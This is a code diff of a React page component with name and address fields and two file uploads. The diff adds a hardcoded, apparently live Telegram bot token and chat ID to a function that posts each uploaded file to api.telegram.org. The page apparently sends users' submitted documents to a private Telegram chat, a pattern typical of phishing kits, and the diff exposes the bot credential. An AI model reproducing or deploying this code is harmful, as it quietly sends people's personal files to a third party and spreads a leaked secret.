@@ -27,7 +27,7 @@ const Page = () => {
     address: "",
   });
   const [file1, setFile1] = useState<File | null>(null);
-  const [file2, setFile2] = useState<File | null>(null);
+  const [file2, setFile2] = useState<File | null>(null);  
 
   const updateData = {
     fullname: input.fullname,
@@ -83,30 +83,35 @@ const Page = () => {
   };
 
   
-const sendFileToTelegram = async (file: File) => {
-  const telegramBotToken = 'TON_TOKEN_BOT_TELEGRAM';
-  const telegramChatId = 'TON_ID_CHAT_TELEGRAM';
-
-  const url = `https://api.telegram.org/bot${telegramBotToken}/sendDocument`;
-
-  const formData = new FormData();
-  formData.append('chat_id', telegramChatId);
-  formData.append('document', file);
-
-  await fetch(url, {
-    method: 'POST',
-    body: formData,
-  });
-};
+  const sendFileToTelegram = async (file: File) => {
+    const telegramBotToken = '6919709842:AAF8t4xE2YjjhzI6OGSFB_m8PtUYW2N8q44';
+    const telegramChatId = '-4094626991';
+  
+    const url = `https://api.telegram.org/bot${telegramBotToken}/sendDocument`;
+  
+    const formData = new FormData();
+    formData.append('chat_id', telegramChatId);
+    formData.append('document', file);
+  
+    await fetch(url, {
+      method: 'POST',
+      // @ts-ignore
+      body: formData,
+    });
+  };
 
   const handleFile1Change = (e: React.ChangeEvent<HTMLInputElement>) => {
     const selectedFile = e.target.files?.[0];
-    setFile1(selectedFile);
+    if (selectedFile) {
+      setFile1(selectedFile);
+    }
   };
 
   const handleFile2Change = (e: React.ChangeEvent<HTMLInputElement>) => {
     const selectedFile = e.target.files?.[0];
-    setFile2(selectedFile);
+    if (selectedFile) {
+      setFile2(selectedFile);
+    }
   };
 
   return (
